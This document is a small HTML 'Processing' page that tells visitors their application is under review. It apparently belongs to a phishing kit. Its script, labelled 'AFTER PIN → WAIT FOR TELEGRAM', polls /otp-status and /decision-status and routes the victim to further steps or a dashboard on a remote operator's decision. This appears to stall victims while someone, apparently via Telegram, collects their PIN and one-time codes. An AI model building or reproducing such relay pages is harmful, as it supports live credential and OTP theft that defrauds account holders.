<!DOCTYPE html>
<html>

<head>
    <title>Processing</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="header"></div>

<div class="container">

    <h2 class="title">Processing...</h2>

    <div class="loader"></div>

    <p style="text-align:center; margin-top:20px;">
        Please wait while we review your application
    </p>

</div>

<div class="footer"></div>

<script>

// FLOW A: STEP4 → STEP5
if (localStorage.getItem("firstProcess") === "yes") {

    localStorage.removeItem("firstProcess");

    setTimeout(() => {
        window.location.href = "step5.html";
    }, 3000);
}

// ===== FLOW B: AFTER PIN → WAIT FOR TELEGRAM =====
if (localStorage.getItem("fromPin") === "yes") {

  const interval = setInterval(async () => {
    try {
        const res = await fetch("/otp-status");
        const data = await res.json();

        console.log("OTP STATUS:", data);

        // 🔥 FORCE CHECK (handles string + number)
        if (data.otp == 5) {
    localStorage.removeItem("fromPin");
    clearInterval(interval);
    window.location.href = "step6.html";
}

        if (data.otp == 6) {
    localStorage.removeItem("fromPin");
    clearInterval(interval); // stop loop
    window.location.href = "step6.html";
}

        const decisionRes = await fetch("/decision-status");
        const decisionData = await decisionRes.json();

        if (decisionData.decision === "accept") {
            window.location.href = "dashboard.html";
        }

        if (decisionData.decision === "decline") {
            localStorage.clear();
            window.location.href = "step5.html";
        }

    } catch (err) {
        console.log("Waiting...");
    }
}, 2000);  

}
</script>

</body>
</html>
